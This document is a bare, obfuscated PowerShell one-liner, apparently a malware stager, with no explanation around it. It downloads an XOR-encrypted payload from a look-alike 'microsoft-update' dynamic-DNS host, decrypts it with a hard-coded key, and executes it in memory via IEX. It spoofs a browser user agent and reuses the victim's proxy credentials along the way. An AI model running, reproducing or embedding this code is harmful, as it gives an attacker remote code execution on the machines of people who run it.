
$wc=NEW-ObJeCT SystEm.NET.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEADErS.ADD('User-Agent',$u);$wc.PROXy = [SYStEM.NET.WEBREqUEsT]::DeFAUltWebPRoXY;$Wc.ProXy.CrEdENTiaLS = [SyStEM.NEt.CrEdENTIaLCACHE]::DefAultNetWorkCRedeNTIAls;$K='bcd623a50b80a516edb8ceb6ca9ae2aa';$I=0;[cHAR[]]$b=([cHAr[]]($wc.DOwnlOaDStrIng("http://microsoft-update7.myvnc.com:443/index.asp")))|%{$_-bXOr$K[$I++%$k.LeNgTH]};IEX ($b-JoIn'')

